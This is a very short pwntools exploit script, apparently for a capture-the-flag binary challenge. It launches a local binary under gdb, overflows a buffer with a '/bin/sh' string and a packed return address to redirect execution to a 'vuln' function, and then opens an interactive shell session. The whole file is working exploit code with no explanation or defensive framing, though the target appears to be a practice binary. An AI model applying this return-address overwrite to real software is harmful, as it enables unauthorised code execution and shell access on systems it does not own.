from pwn import *

p=gdb.debug('./pwn.bak','break vuln')
vuln_addr=0x00000000004004ED


payload=b'/bin/sh\x00'*2+p64(vuln_addr)
p.send(payload)

p.interactive()

